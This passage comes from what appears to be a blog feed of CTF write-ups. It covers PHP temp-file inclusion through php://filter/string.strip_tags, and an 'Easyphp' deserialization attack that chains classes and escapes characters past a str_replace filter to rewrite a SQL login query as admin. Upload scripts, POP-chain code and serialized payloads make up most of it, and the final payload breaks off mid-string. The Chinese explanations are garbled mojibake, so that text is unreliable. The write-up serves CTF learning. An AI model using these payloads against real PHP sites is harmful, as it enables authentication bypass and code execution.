</p><p>è¾“å…¥payloadåï¼Œä¼šå¯¼è‡´PHPå´©æºƒæ¸…ç©ºå †æ ˆé‡å¯ï¼Œå¦‚æœåŒæ—¶ä¸Šä¼ äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œé‚£ä¹ˆè¿™ä¸ªtmp fileå°±ä¼šä¸€ç›´ç•™åœ¨tmpç›®å½•ï¼Œå†è¿›è¡Œæ–‡ä»¶åçˆ†ç ´å°±å¯ä»¥getshell         </p><p><a href="https://www.cnblogs.com/tr1ple/p/11301743.html">å…³äºphpæ–‡ä»¶æ“ä½œçš„å‡ ä¸ªå°trick </a></p><p>ä¸Šä¼ è„šæœ¬     </p><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIOurl=<span class="hljs-string">&#x27;http://e17fbb9d-53e9-44fc-9c60-91d0f4e7e017.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&#x27;</span>file=&#123;<span class="hljs-string">&#x27;file&#x27;</span>:BytesIO(<span class="hljs-string">b&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>)&#125;r=requests.post(url=url,files=file,allow_redirects=<span class="hljs-literal">False</span>)print(<span class="hljs-string">&quot;YEs&quot;</span>)</code></pre></code></pre><p>åº”è¯¥å†™ä¸€å¥è¯æœ¨é©¬çš„ï¼Œä½†æˆ‘è¯•äº†å¥½å‡ æ¬¡éƒ½æ²¡æˆåŠŸï¼Œ<code>phpinfo();</code>éƒ½æ²¡æ³•æ‰§è¡Œ       </p><p>ç„¶åä¼šåœ¨<code>dir.php</code>ï¼ˆåŒ…å«/tmpä¸­çš„æ–‡ä»¶ï¼‰ä¸­å¾—åˆ°æ–‡ä»¶å       </p><p><code>array(3) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [4]=&gt; string(9) &quot;phpTwf0sR&quot;</code>      </p><p>åŒ…å«å³å¯      </p><p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/4f1e5174-3581-4ee9-bbc9-9e1cd96ee7f2.png" alt="05.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>æ–‡ä»¶è¯»å–</tag>
      
      <tag>php://filter/string.strip_tags</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Easyphp</title>
    <link href="/2021/04/30/BUU80/"/>
    <url>/2021/04/30/BUU80/</url>
    
    <content type="html"><![CDATA[<h2 id="unserialize-char-escape"><a href="#unserialize-char-escape" class="headerlink" title="unserialize char-escape"></a>unserialize char-escape</h2><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/186967/37/782/447665/608c1c8bE8f062515/dd33c81b065b285b.png" alt="01.png"></p><p>æ²¡æœ‰<code>registe.php</code>     </p><p>ä¸€å¼€å§‹çŒœçš„æ˜¯SQLæ³¨å…¥       </p><p>æ³¨å…¥äº†ä¸€ä¼šï¼Œæœ‰ç‚¹æƒ³æ”¾å¼ƒäº†ï¼Œçœ‹äº†ä¸‹<code>www.zip</code>   </p><p>å±…ç„¶æœ‰     </p><p>çœ‹æ¥ä¸æ˜¯SQLiäº†      </p><p>å››ä¸ªPHPæ–‡ä»¶    </p><p><code>index.php</code>      </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;lib.php&quot;</span>;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;action&#x27;</span>]))&#123;<span class="hljs-keyword">require_once</span>(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&quot;/&quot;</span>.$_GET[<span class="hljs-string">&#x27;action&#x27;</span>].<span class="hljs-string">&quot;.php&quot;</span>);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">if</span>($_SESSION[<span class="hljs-string">&#x27;login&#x27;</span>]==<span class="hljs-number">1</span>)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=update&#x27;&lt;/script&gt;&quot;</span>;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=login&#x27;&lt;/script&gt;&quot;</span>;&#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p><code>lib.php</code>        </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);session_start();<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe</span>(<span class="hljs-params">$parm</span>)</span><span class="hljs-function"></span>&#123;    $array = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;union&#x27;</span>, <span class="hljs-string">&#x27;regexp&#x27;</span>, <span class="hljs-string">&#x27;load&#x27;</span>, <span class="hljs-string">&#x27;into&#x27;</span>, <span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;alter&quot;</span>);    <span class="hljs-keyword">return</span> str_replace($array, <span class="hljs-string">&#x27;hacker&#x27;</span>, $parm);&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $id;    <span class="hljs-keyword">public</span> $age = <span class="hljs-literal">null</span>;    <span class="hljs-keyword">public</span> $nickname = <span class="hljs-literal">null</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;            $mysqli = <span class="hljs-keyword">new</span> dbCtrl();            <span class="hljs-keyword">$this</span>-&gt;id = $mysqli-&gt;login(<span class="hljs-string">&#x27;select id,password from user where username=?&#x27;</span>);            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;id) &#123;                $_SESSION[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-keyword">$this</span>-&gt;id;                $_SESSION[<span class="hljs-string">&#x27;login&#x27;</span>] = <span class="hljs-number">1</span>;                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ä½ çš„IDæ˜¯&quot;</span> . $_SESSION[<span class="hljs-string">&#x27;id&#x27;</span>];                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ä½ å¥½ï¼&quot;</span> . $_SESSION[<span class="hljs-string">&#x27;token&#x27;</span>];                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;</span>;                <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;id;            &#125;        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        $Info = unserialize(<span class="hljs-keyword">$this</span>-&gt;getNewinfo());        $age = $Info-&gt;age;        $nickname = $Info-&gt;nickname;        $updateAction = <span class="hljs-keyword">new</span> UpdateHelper($_SESSION[<span class="hljs-string">&#x27;id&#x27;</span>], $Info, <span class="hljs-string">&quot;update user SET age=<span class="hljs-subst">$age</span>,nickname=<span class="hljs-subst">$nickname</span> where id=&quot;</span> . $_SESSION[<span class="hljs-string">&#x27;id&#x27;</span>]);        <span class="hljs-comment">//è¿™ä¸ªåŠŸèƒ½è¿˜æ²¡æœ‰å†™å®Œ å…ˆå å‘</span>    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getNewInfo</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        $age = $_POST[<span class="hljs-string">&#x27;age&#x27;</span>];        $nickname = $_POST[<span class="hljs-string">&#x27;nickname&#x27;</span>];        <span class="hljs-keyword">return</span> safe(serialize(<span class="hljs-keyword">new</span> Info($age, $nickname)));    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">return</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;nickname); <span class="hljs-comment">//å±</span>    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;nickname-&gt;update(<span class="hljs-keyword">$this</span>-&gt;age);        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;0-0&quot;</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $age;    <span class="hljs-keyword">public</span> $nickname;    <span class="hljs-keyword">public</span> $CtrlCase;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$age, $nickname</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;age = $age;        <span class="hljs-keyword">$this</span>-&gt;nickname = $nickname;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params">$name, $argument</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="hljs-number">0</span>]);    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UpdateHelper</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $id;    <span class="hljs-keyword">public</span> $newinfo;    <span class="hljs-keyword">public</span> $sql;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$newInfo, $sql</span>)</span><span class="hljs-function">    </span>&#123;        $newInfo = unserialize($newInfo);        $upDate = <span class="hljs-keyword">new</span> dbCtrl();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;sql;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dbCtrl</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $hostname = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;    <span class="hljs-keyword">public</span> $dbuser = <span class="hljs-string">&quot;root&quot;</span>;    <span class="hljs-keyword">public</span> $dbpass = <span class="hljs-string">&quot;root&quot;</span>;    <span class="hljs-keyword">public</span> $database = <span class="hljs-string">&quot;test&quot;</span>;    <span class="hljs-keyword">public</span> $name;    <span class="hljs-keyword">public</span> $password;    <span class="hljs-keyword">public</span> $mysqli;    <span class="hljs-keyword">public</span> $token;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;name = $_POST[<span class="hljs-string">&#x27;username&#x27;</span>];        <span class="hljs-keyword">$this</span>-&gt;password = $_POST[<span class="hljs-string">&#x27;password&#x27;</span>];        <span class="hljs-keyword">$this</span>-&gt;token = $_SESSION[<span class="hljs-string">&#x27;token&#x27;</span>];    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params">$sql</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;mysqli = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-keyword">$this</span>-&gt;hostname, <span class="hljs-keyword">$this</span>-&gt;dbuser, <span class="hljs-keyword">$this</span>-&gt;dbpass, <span class="hljs-keyword">$this</span>-&gt;database);        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¿æ¥å¤±è´¥ï¼Œé”™è¯¯:&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;mysqli-&gt;connect_error);        &#125;        $result = <span class="hljs-keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);        $result-&gt;bind_param(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;name);        $result-&gt;execute();        $result-&gt;bind_result($idResult, $passwordResult);        $result-&gt;fetch();        $result-&gt;close();        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;token == <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;            <span class="hljs-keyword">return</span> $idResult;        &#125;        <span class="hljs-keyword">if</span> (!$idResult) &#123;            <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;ç”¨æˆ·ä¸å­˜åœ¨!&#x27;</span>);            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        &#125;        <span class="hljs-keyword">if</span> (md5(<span class="hljs-keyword">$this</span>-&gt;password) !== $passwordResult) &#123;            <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;å¯†ç é”™è¯¯ï¼&#x27;</span>);            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        &#125;        $_SESSION[<span class="hljs-string">&#x27;token&#x27;</span>] = <span class="hljs-keyword">$this</span>-&gt;name;        <span class="hljs-keyword">return</span> $idResult;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params">$sql</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-comment">//è¿˜æ²¡æ¥å¾—åŠå†™</span>    &#125;&#125;</code></pre></code></pre><p><code>login.php</code>      </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib.php&#x27;</span>);<span class="hljs-meta">?&gt;</span>&lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt; &lt;title&gt;login&lt;/title&gt;&lt;center&gt;&lt;form action=<span class="hljs-string">&quot;login.php&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> style=<span class="hljs-string">&quot;margin-top: 300&quot;</span>&gt;&lt;h2&gt;ç™¾ä¸‡å‰ç«¯çš„ç”¨æˆ·ä¿¡æ¯ç®¡ç†ç³»ç»Ÿ&lt;/h2&gt;&lt;h3&gt;åŠæˆå“ç³»ç»Ÿ ç•™åé—¨çš„ç¨‹åºå‘˜å·²ç»è·‘è·¯&lt;/h3&gt;        &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;username&quot;</span> placeholder=<span class="hljs-string">&quot;UserName&quot;</span> required&gt;&lt;br&gt;&lt;input type=<span class="hljs-string">&quot;password&quot;</span> style=<span class="hljs-string">&quot;margin-top: 20&quot;</span> name=<span class="hljs-string">&quot;password&quot;</span> placeholder=<span class="hljs-string">&quot;password&quot;</span> required&gt;&lt;br&gt;&lt;button style=<span class="hljs-string">&quot;margin-top:20;&quot;</span> type=<span class="hljs-string">&quot;submit&quot;</span>&gt;ç™»å½•&lt;/button&gt;&lt;br&gt;&lt;img src=<span class="hljs-string">&#x27;img/1.jpg&#x27;</span>&gt;å¤§å®¶è®°å¾—åšå¥½é˜²æŠ¤&lt;/img&gt;&lt;br&gt;&lt;br&gt;<span class="hljs-meta">&lt;?php</span> $user=<span class="hljs-keyword">new</span> user();<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;username&#x27;</span>]))&#123;<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i&quot;</span>, $_POST[<span class="hljs-string">&#x27;username&#x27;</span>]))&#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;br&gt;Damn you, hacker!&quot;</span>);&#125;<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i&quot;</span>, $_POST[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Damn you, hacker!&quot;</span>);&#125;$user-&gt;login();&#125;<span class="hljs-meta">?&gt;</span>&lt;/form&gt;&lt;/center&gt;</code></pre></code></pre><p><code>update.php</code>       </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib.php&#x27;</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;html&gt;</span><span class="hljs-string">&lt;meta charset=&quot;utf-8&quot;&gt;</span><span class="hljs-string">&lt;title&gt;update&lt;/title&gt;</span><span class="hljs-string">&lt;h2&gt;è¿™æ˜¯ä¸€ä¸ªæœªå®Œæˆçš„é¡µé¢ï¼Œä¸Šçº¿æ—¶å»ºè®®åˆ é™¤æœ¬é¡µé¢&lt;/h2&gt;</span><span class="hljs-string">&lt;/html&gt;&#x27;</span>;<span class="hljs-keyword">if</span> ($_SESSION[<span class="hljs-string">&#x27;login&#x27;</span>]!=<span class="hljs-number">1</span>)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ä½ è¿˜æ²¡æœ‰ç™»é™†å‘¢ï¼&quot;</span>;&#125;$users=<span class="hljs-keyword">new</span> User();$users-&gt;update();<span class="hljs-keyword">if</span>($_SESSION[<span class="hljs-string">&#x27;login&#x27;</span>]===<span class="hljs-number">1</span>)&#123;<span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<span class="hljs-keyword">echo</span> $flag;&#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>è¿™ä¸ªç½‘ç«™çš„é€»è¾‘å°±æ˜¯è¦ä»¥adminç™»å½•ï¼Œé€šè¿‡SQLè¯­å¥æŸ¥è¯¢ï¼Œæ¯”è¾ƒIDå’Œpasswdï¼Œæ­£ç¡®çš„è¯ï¼Œè·³è½¬åˆ°<code>update.php</code>ï¼Œå¾—åˆ°flag    </p><p>ä¸»è¦æ˜¯<code>lib.php</code>     </p><pre><code>function safe($parm)&#123;    $array = array(&#39;union&#39;, &#39;regexp&#39;, &#39;load&#39;, &#39;into&#39;, &#39;flag&#39;, &#39;file&#39;, &#39;insert&#39;, &quot;&#39;&quot;, &#39;\\&#39;, &quot;*&quot;, &quot;alter&quot;);    return str_replace($array, &#39;hacker&#39;, $parm);&#125;</code></pre><p>çœ‹åˆ°è¿™ä¸ªï¼Œåº”è¯¥æƒ³åˆ°é‚£ä¸ªååºåˆ—åŒ–çš„å­—ç¬¦é€ƒé€¸äº†    </p><pre><code>$this-&gt;id = $mysqli-&gt;login(&#39;select id,password from user where username=?&#39;);         </code></pre><hr><pre><code>public function __call($name, $argument)    &#123;        echo $this-&gt;CtrlCase-&gt;login($argument[0]);    &#125;</code></pre><p>ä¸¤ä¸ªloginï¼Œè€Œä¸”ç¬¬äºŒä¸ªloginçš„å‚æ•°æ˜¯å¯æ§çš„     </p><p>æ‰€ä»¥     </p><p>ä»¥æ­¤ï¼Œæ„é€ popé“¾ååºåˆ—åŒ–ä¿®æ”¹SQLè¯­å¥     </p><p>å…¥å£â€”&gt;update.phpé‡Œçš„       </p><pre><code>$users=new User();$users-&gt;update();        </code></pre><p>è·Ÿè¿›<code>lib.php</code>é‡Œçš„update()      </p><p>é¦–å…ˆ<code>  $Info = unserialize($this-&gt;getNewinfo());</code>åº”è¯¥æ˜¯å‡ºå£äº†      </p><p>è¿™ä¸ª<code>$updateAction = new UpdateHelper($_SESSION[&#39;id&#39;],$Info, &quot;update user SET age=$age,nickname=$nickname where id=&quot; . $_SESSION[&#39;id&#39;]);</code>    </p><p>è·Ÿè¿›<code>UpdateHelper</code>    </p><p><code>$sql</code>æ²¡æœ‰ä½¿ç”¨ï¼Œä¸”<code>echo $this-&gt;sql;</code>        </p><p>è®©<code>sql=new User()</code>æ¥è§¦å‘toString     </p><pre><code>public function __toString()    &#123;        $this-&gt;nickname-&gt;update($this-&gt;age);        return &quot;0-0&quot;;    &#125; </code></pre><p>è®©<code>nickname=new Info()</code>æ¥è§¦å‘<code>__call</code></p><pre><code>public function __call($name, $argument)&#123;    echo $this-&gt;CtrlCase-&gt;login($argument[0]);&#125;      </code></pre><p>æ¥ç€è®©<code>CtrlCase=new dbCtrl()</code>å°±å¯ä»¥æ‰§è¡Œè‡ªå®šçš„SQLäº†    </p><p>å°†passwordä¿®æ”¹     </p><pre><code>select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?</code></pre><p>c4ca4238a0b923820dcc509a6f75849bæ˜¯1çš„MD5å€¼      </p><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/192784/20/706/130842/608c3197Ec5588c09/d8bef464f63eb40a.png" alt="03.png"></p><p>è¿™æ ·å†æ§åˆ¶dbCtrlé‡Œçš„nameå’Œpasswordå°±å¯ä»¥ä»¥adminç™»å½•       </p><p>ä¹‹å     </p><pre><code>$_SESSION[&#39;token&#39;] = $this-&gt;name;        return $idResult;      </code></pre><p>é‡æ–°ç™»é™†æ—¶ä¸ç®¡å¯†ç æ˜¯ä»€ä¹ˆéƒ½èƒ½ç™»é™†æˆåŠŸï¼Œå¾—åˆ°flagäº†     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UpdateHelper</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $sql;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;sql=<span class="hljs-keyword">new</span> User();    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $age;    <span class="hljs-keyword">public</span> $nickname;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;                <span class="hljs-keyword">$this</span>-&gt;age=<span class="hljs-string">&#x27;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#x27;</span>;        <span class="hljs-keyword">$this</span>-&gt;nickname=<span class="hljs-keyword">new</span> Info();    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $CtrlCase;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;CtrlCase=<span class="hljs-keyword">new</span> dbCtrl();    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dbCtrl</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $name=<span class="hljs-string">&#x27;admin&#x27;</span>;    <span class="hljs-keyword">public</span> $password=<span class="hljs-string">&#x27;1&#x27;</span>;&#125;$a=<span class="hljs-keyword">new</span> UpdateHelper();<span class="hljs-keyword">echo</span> serialize($a);</code></pre></code></pre><p>ç»“æœä¸º</p><pre><code>O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;      </code></pre><p>å›åˆ°å‡ºå£å¤„     </p><p><code>getNewInfo()</code>ä¸­     </p><pre><code>return safe(serialize(new Info($age, $nickname)));     </code></pre><p>è¿™é‡Œåºåˆ—åŒ–çš„æ˜¯ä¸€ä¸ªæ–°ç±»ï¼Œè¿™æ ·çš„è¯ï¼Œåˆšæ‰å¾—åˆ°çš„payloadåªä¼šè¢«è§†ä¸ºä¸€ä¸ªé•¿çš„å­—ç¬¦ä¸²ï¼Œå¹¶ä¸ä¼šè¢«ååºåˆ—åŒ–       </p><p>æ‰€ä»¥è¦å­—ç¬¦é€ƒé€¸       </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $age=<span class="hljs-number">1</span>;    <span class="hljs-keyword">public</span> $nickname=<span class="hljs-string">&#x27;123&#x27;</span>;    <span class="hljs-keyword">public</span> $CtrlCase=<span class="hljs-number">123</span>;&#125;$a=<span class="hljs-keyword">new</span> Info();<span class="hljs-keyword">echo</span> serialize($a);</code></pre></code></pre><p>è¾“å‡ºï¼š<code>O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;i:1;s:8:&quot;nickname&quot;;s:3:&quot;123&quot;;s:8:&quot;CtrlCase&quot;;i:123;&#125;</code>       </p><p>è¦æƒ³é€ƒé€¸ï¼Œéœ€è¦å†åˆšæ‰çš„payloadå‰åŠ ä¸Š<code>&quot;;s:8:&quot;CtrlCase&quot;;</code>ï¼ˆ<code>&quot;</code>æ¥é—­åˆåºåˆ—åŒ–åç”Ÿæˆçš„<code>&quot;</code>ï¼‰åé¢åŠ ä¸Š<code>&#125;</code>æ¥æå‰ç»“æŸååºåˆ—åŒ–     </p><p>payload:<code>&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;</code>      </p><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/179326/17/1720/143813/608c2f0bEd5a3e0ed/156a14c371a68116.png" alt="02.png"></p><p>å¯ä»¥çœ‹åˆ°é•¿åº¦ä¸º263       </p><p>åœ¨åŒå¼•å·ä¸­åŠ å…¥263ä¸ªunionï¼Œæˆ–è€…å…¶ä»–ï¼ˆé‚£ä¸ªsafeå‡½æ•°ä¸­çš„ï¼Œåªè¦å‡‘å¤Ÿ263å³å¯ï¼‰      </p><p>ç»è¿‡safeå‡½æ•°åï¼Œå°±å¤šå‡º263ä¸ªï¼Œå°±å°†åŸæ¥çš„263ä¸ªé€ƒé€¸å‡ºæ¥äº†       </p><p>æœ€ç»ˆpayloadï¼š</p><pre><code>   age=1&amp;nickname=unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3